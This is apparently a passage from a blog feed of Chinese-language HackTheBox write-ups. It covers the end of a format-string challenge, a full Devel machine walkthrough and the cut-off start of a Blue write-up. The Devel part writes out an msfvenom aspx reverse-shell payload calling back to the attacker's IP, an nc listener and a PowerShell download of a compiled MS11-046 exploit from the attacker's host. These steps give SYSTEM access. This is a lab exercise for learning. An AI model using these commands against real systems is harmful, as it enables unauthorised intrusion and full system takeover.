Done</span><br><span class="line">HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;\x00e.7üCú÷</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Recon&quot;&gt;&lt;a href=&quot;#Recon&quot; class=&quot;headerlink&quot; title=&quot;Recon&quot;&gt;&lt;/a&gt;Recon&lt;/h2&gt;&lt;p&gt;首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="fmtstr" scheme="https://kazma.tw/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Devel Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Devel-Writeup/</id>
    <published>2024-10-27T11:27:24.862Z</published>
    <updated>2024-10-28T13:09:23.275Z</updated>
    
    <content type="html"><![CDATA[<p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.153.100</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:29 CDT</span><br><span class="line">Stats: 0:03:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan</span><br><span class="line">NSE Timing: About 99.64% <span class="keyword">done</span>; ETC: 06:33 (0:00:01 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.153.100</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:microsoft:internet_information_services:7.5: </span><br><span class="line">|     PACKETSTORM:18058010.0https://vulners.com/packetstorm/PACKETSTORM:180580*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-10.0https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-*EXPLOIT*</span><br><span class="line">|     CVE-2010-397210.0https://vulners.com/cve/CVE-2010-3972</span><br><span class="line">|     SSV:201229.3https://vulners.com/seebug/SSV:20122*EXPLOIT*</span><br><span class="line">|     CVE-2010-27309.3https://vulners.com/cve/CVE-2010-2730</span><br><span class="line">|     SSV:201214.3https://vulners.com/seebug/SSV:20121*EXPLOIT*</span><br><span class="line">|     PACKETSTORM:1805844.3https://vulners.com/packetstorm/PACKETSTORM:180584*EXPLOIT*</span><br><span class="line">|     MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-4.3https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-*EXPLOIT*</span><br><span class="line">|     CVE-2010-18994.3https://vulners.com/cve/CVE-2010-1899</span><br><span class="line">|     EDB-ID:158030.0https://vulners.com/exploitdb/EDB-ID:15803*EXPLOIT*</span><br><span class="line">|_    EDB-ID:151670.0https://vulners.com/exploitdb/EDB-ID:15167*EXPLOIT*</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 263.50 seconds</span></span><br></pre></td></tr></table></figure></div><p>他有開 ftp，我們可以用 <code>anonymous</code> 登入看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.153.100</span><br><span class="line">Connected to 10.129.153.100.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.153.100:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; <span class="built_in">dir</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></div><p>透過瀏覽器可以看到下面的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_ftp.png"                      alt="ftp"                ><br>這表示了 FTP 跟 HTTP 伺服器共享同一個根目錄，這問題很大，因為我們可以透過上傳惡意的文件，然後透過 http 來觸發，例如說 reverse shell。<br>這邊會用到 metasploit 框架中的一個工具，可以用來生 payloads。<br>透過下面的指令我們可以看到 <code>aspx</code> 是支援的格式，同時從剛剛 FTP 的資訊我們可以看到他的目錄名稱應該是 ASP.NET 生成的，包括 <code>iisstart.htm</code> 是一個標準的 IIS（Internet Information Services） 的起始頁面，可以得知上面在運行 Microsoft IIS Web 的伺服器。根據上面的資訊我們會用 aspx 來生成我們的 reverse shell。</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list formats</span><br><span class="line"></span><br><span class="line">Framework Executable Formats [--format &lt;value&gt;]</span><br><span class="line">===============================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    asp</span><br><span class="line">    aspx</span><br><span class="line">    aspx-exe</span><br><span class="line">    axis2</span><br><span class="line">    dll</span><br><span class="line">    ducky-script-psh</span><br><span class="line">    elf</span><br><span class="line">    elf-so</span><br><span class="line">    exe</span><br><span class="line">    exe-only</span><br><span class="line">    exe-service</span><br><span class="line">    exe-small</span><br><span class="line">    hta-psh</span><br><span class="line">    jar</span><br><span class="line">    jsp</span><br><span class="line">    loop-vbs</span><br><span class="line">    macho</span><br><span class="line">    msi</span><br><span class="line">    msi-nouac</span><br><span class="line">    osx-app</span><br><span class="line">    psh</span><br><span class="line">    psh-cmd</span><br><span class="line">    psh-net</span><br><span class="line">    psh-reflection</span><br><span class="line">    python-reflection</span><br><span class="line">    vba</span><br><span class="line">    vba-exe</span><br><span class="line">    vba-psh</span><br><span class="line">    vbs</span><br><span class="line">    war</span><br></pre></td></tr></table></figure></div><p>我們用下面的指令選一個看起來最普通的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom --list payloads | grep windows | grep reverse </span><br></pre></td></tr></table></figure></div><p>生 reverse shell：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/x64/shell/reverse_tcp -f aspx lhost=tun0 lport=4444 rhost=10.129.151.61 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of aspx file: 3675 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>生好了！接著我們把他丟上去 FTP </p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ftp 10.129.151.61</span><br><span class="line">Connected to 10.129.151.61.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.129.151.61:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password: </span><br><span class="line">230 User logged <span class="keyword">in</span>.</span><br><span class="line">Remote system <span class="built_in">type</span> is Windows_NT.</span><br><span class="line">ftp&gt; put rshell.aspx </span><br><span class="line"><span class="built_in">local</span>: rshell.aspx remote: rshell.aspx</span><br><span class="line">229 Entering Extended Passive Mode (|||49157|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">100% |*************************************************************************************************|  3722       59.15 MiB/s    --:-- ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">3722 bytes sent <span class="keyword">in</span> 00:00 (13.98 KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">229 Entering Extended Passive Mode (|||49158|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  04:37PM                  689 iisstart.htm</span><br><span class="line">10-28-24  01:39PM                 3722 rshell.aspx</span><br><span class="line">03-17-17  04:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure></div><p>結果上面那個 payload 好像行不通，我換成下面這個就成功了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=4444 -o rshell.aspx</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 324 bytes</span><br><span class="line">Final size of aspx file: 2719 bytes</span><br><span class="line">Saved as: rshell.aspx</span><br></pre></td></tr></table></figure></div><p>然後瀏覽器訪問就觸發 reverse shell 了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nc -nlvp 4444 </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.63] from (UNKNOWN) [10.129.151.61] 49168</span><br><span class="line">Microsoft Windows [Version 6.1.7600]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;</span><br></pre></td></tr></table></figure></div><p>結果進去之後連 user flag 的權限都還沒有，然後也發現這台伺服器是 x86 難怪剛剛的第一次的 payload 不會過：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;<span class="built_in">cd</span> babis</span><br><span class="line"><span class="built_in">cd</span> babis</span><br><span class="line">Access is denied.</span><br><span class="line"></span><br><span class="line">c:\Users&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 137F-3971</span><br><span class="line"></span><br><span class="line"> Directory of c:\Users</span><br><span class="line"></span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          .</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          ..</span><br><span class="line">18/03/2017  01:16 ��    &lt;DIR&gt;          Administrator</span><br><span class="line">17/03/2017  04:17 ��    &lt;DIR&gt;          babis</span><br><span class="line">18/03/2017  01:06 ��    &lt;DIR&gt;          Classic .NET AppPool</span><br><span class="line">14/07/2009  09:20 ��    &lt;DIR&gt;          Public</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               6 Dir(s)   4.396.625.920 bytes free</span><br><span class="line"></span><br><span class="line">c:\Users&gt;systeminfo </span><br><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line">Host Name:                 DEVEL</span><br><span class="line">OS Name:                   Microsoft Windows 7 Enterprise </span><br><span class="line">OS Version:                6.1.7600 N/A Build 7600</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          babis</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                55041-051-0948536-86302</span><br><span class="line">Original Install Date:     17/3/2017, 4:17:31 ��</span><br><span class="line">System Boot Time:          28/10/2024, 1:26:00 ��</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware Virtual Platform</span><br><span class="line">System Type:               X86-based PC</span><br><span class="line">Processor(s):              1 Processor(s) Installed.</span><br><span class="line">                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz</span><br><span class="line">BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020</span><br><span class="line">Windows Directory:         C:\Windows</span><br><span class="line">System Directory:          C:\Windows\system32</span><br><span class="line">Boot Device:               \Device\HarddiskVolume1</span><br><span class="line">System Locale:             el;Greek</span><br><span class="line">Input Locale:              en-us;English (United States)</span><br><span class="line">Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul</span><br><span class="line">Total Physical Memory:     3.071 MB</span><br><span class="line">Available Physical Memory: 2.456 MB</span><br><span class="line">Virtual Memory: Max Size:  6.141 MB</span><br><span class="line">Virtual Memory: Available: 5.535 MB</span><br><span class="line">Virtual Memory: In Use:    606 MB</span><br><span class="line">Page File Location(s):     C:\pagefile.sys</span><br><span class="line">Domain:                    HTB</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 N/A</span><br><span class="line">Network Card(s):           1 NIC(s) Installed.</span><br><span class="line">                           [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                                 Connection Name: Local Area Connection 4</span><br><span class="line">                                 DHCP Enabled:    Yes</span><br><span class="line">                                 DHCP Server:     10.129.0.1</span><br><span class="line">                                 IP address(es)</span><br><span class="line">                                 [01]: 10.129.151.61</span><br><span class="line">                                 [02]: fe80::d981:e519:55b8:816</span><br><span class="line">                                 [03]: dead:beef::8870:1e16:d944:cf4e</span><br><span class="line">                                 [04]: dead:beef::d981:e519:55b8:816</span><br></pre></td></tr></table></figure></div><p>從上面的資訊我們還可以得知作業系統的版本很舊，是 Windows 7 最早期的版本，已知存在許多漏洞。<br>我們可以透過 <code>searchsploit</code> 來找尋 Exploit Database (exploit-db) 中的漏洞資料使用方法如下，我們可以先去 google win7 x86 提權有哪些：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_exploitDB.png"                      alt="db"                ><br>然後在上面可以看到左上角有一個 EDB-ID 我們可以這樣用：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -u <span class="comment">## update</span></span><br><span class="line">└──╼ [★]$ searchsploit -m 47176</span><br><span class="line">  Exploit: Microsoft Windows 7 build 7601 (x86) - Local Privilege Escalation</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/47176</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/47176.cpp</span><br><span class="line">    Codes: CVE-2019-1132</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/47176.cpp</span><br></pre></td></tr></table></figure></div><p>結果他沒有寫要怎麼編譯遇到很多環境問題，決定換另外一個有寫編譯方式的：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ searchsploit -m 40564</span><br><span class="line">  Exploit: Microsoft Windows (x86) - <span class="string">&#x27;afd.sys&#x27;</span> Local Privilege Escalation (MS11-046)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/40564</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c</span><br><span class="line">    Codes: CVE-2011-1249, MS11-046</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C <span class="built_in">source</span>, ASCII text</span><br><span class="line">Copied to: /home/kazma/40564.c</span><br><span class="line"></span><br><span class="line">┌─[eu-dedivip-1]─[10.10.14.63]─[kazma@htb-wnzfbgnuq9]─[~]</span><br><span class="line">└──╼ [★]$ i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32</span><br></pre></td></tr></table></figure></div><p>然後用 python 的 http.server 讓我們從目標機器載下 payload:</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python -m http.server </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure></div><p>從目標機器載下來：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\Users&gt;powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.63:8000/40564.exe&#x27;, &#x27;c:\Users\Public\Downloads\40564.exe&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div><p>執行腳本：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\Users\Public\Downloads&gt;40564.exe</span><br><span class="line">40564.exe</span><br><span class="line"></span><br><span class="line">c:\Windows\System32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure></div><p>拿下機器！</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/devel_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先 &lt;code&gt;nmap&lt;/code&gt; 一下：&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Machines Blue Writeup</title>
    <link href="https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/"/>
    <id>https://kazma.tw/2024/10/27/HackTheBox-Machines-Blue-Writeup/</id>
    <published>2024-10-27T11:08:02.748Z</published>
    <updated>2024-10-27T11:23:08.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>先 <code>nmap</code> 一下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV --script vuln 10.129.208.2</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 06:09 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.208.2</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 991 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 89.41 seconds</span><br></pre></td></tr></table></figure></div><p>感覺跟 legacy 87% 像：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 